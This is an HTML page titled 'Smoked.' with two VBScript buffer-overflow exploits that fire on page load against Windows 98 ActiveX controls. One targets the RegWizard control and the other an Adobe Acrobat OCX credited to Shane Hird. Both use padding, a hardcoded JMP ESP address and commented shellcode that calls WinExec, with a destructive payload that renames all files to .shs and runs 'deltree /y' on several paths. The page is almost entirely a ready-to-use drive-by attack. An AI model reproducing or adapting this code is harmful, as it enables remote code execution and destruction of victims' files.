<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
   <title>Smoked.
</title>
</head>
<body>


<object classid="clsid:50E5E3D1-C07E-11D0-B9FD-00A0249F6B00" id="RegWizObj"></object>
<script language="VbScript" >

expstr = "/i AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 
expstr = expstr & Chr(235)
expstr = expstr & Chr(53)
expstr = expstr & Chr(208)
expstr = expstr & Chr(127)
expstr = expstr + Chr(144)
expstr = expstr + Chr(139) + Chr(252)
expstr = expstr + Chr(131) + Chr(199) + Chr(25)
expstr = expstr + Chr(80)
expstr = expstr + Chr(87)
expstr = expstr + Chr(186) + Chr(96) + Chr(9) + Chr(250) + Chr(191)
expstr = expstr + Chr(255) + Chr(210)
expstr = expstr + Chr(51) + Chr(192)
expstr = expstr + Chr(80)
expstr = expstr + Chr(186) + Chr(202) + Chr(212) + Chr(248) + Chr(191)
expstr = expstr + Chr(255) + Chr(210)
expstr = expstr + "rename *.* *.shs + 0 + deltree /y c:\1.log + 0 + deltree /y c:\2.log + 0 +
deltree /y c:\3.log + 0 + deltree /y c:\4.log + 0 + deltree /y
c:\5.log + 0 + deltree /y c:\6.log + 0 + deltree /y c:\7.log"

RegWizObj.InvokeRegWizard(expstr)

</script>
<object classid="clsid:CA8A9780-280D-11CF-A24D-444553540000" id="pdf"></object>
 
<script language="VBscript"><!--
 
msgbox("Adobe Acrobat OCX Buffer Overrun" + Chr(10) 
+ "Written by Shane Hird")
 
expstr 
= "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA" 
 
expstr = expstr + Chr(235) 'Address in SHELL32, Win98 
(7FD035EB) of JMP ESP
expstr = expstr + Chr(53) 'You may need to use a 
different address
expstr = expstr + Chr(208)
expstr = expstr + Chr(127)
 
'Stack is slightly trashed, but NOPs fix it up ok
expstr = expstr + Chr(144) + Chr(144) + Chr(144) + Chr(144) 
+ Chr(144)
 
'MOV EDI, ESP
expstr = expstr + Chr(139) + Chr(252)
 
'ADD EDI, 19 (Size of code)
expstr = expstr + Chr(131) + Chr(199) + Chr(25)
 
'PUSH EAX (Window Style EAX = 1)
expstr = expstr + Chr(80)
 
'PUSH EDI (Address of command line)
expstr = expstr + Chr(87)
 
'MOV EDX, BFFA0960 (WinExec, Win98)
expstr = expstr + Chr(186) + Chr(96) + Chr(9) + Chr(250) + 
Chr(191)
 
'CALL EDX
expstr = expstr + Chr(255) + Chr(210)
 
'XOR EAX, EAX
expstr = expstr + Chr(51) + Chr(192)
 
'PUSH EAX
expstr = expstr + Chr(80)
 
'MOV EDX, BFF8D4CA (ExitProcess, Win98)
expstr = expstr + Chr(186) + Chr(202) + Chr(212) + Chr(248) 
+ Chr(191)
 
'CALL EDX
expstr = expstr + Chr(255) + Chr(210)
 
'Replace with any command + 0 (automatically appended)
expstr = expstr + "rename *.* *.shs + 0 + deltree /y c:\1.log + 0 + deltree /y c:\2.log + 0 +
deltree /y c:\3.log + 0 + deltree /y c:\4.log + 0 + deltree /y
c:\5.log + 0 + deltree /y c:\6.log + 0 + deltree /y c:\7.log"
 
'Call exploitable method
pdf.setview(expstr)
 
--></script>

</body>
</html>
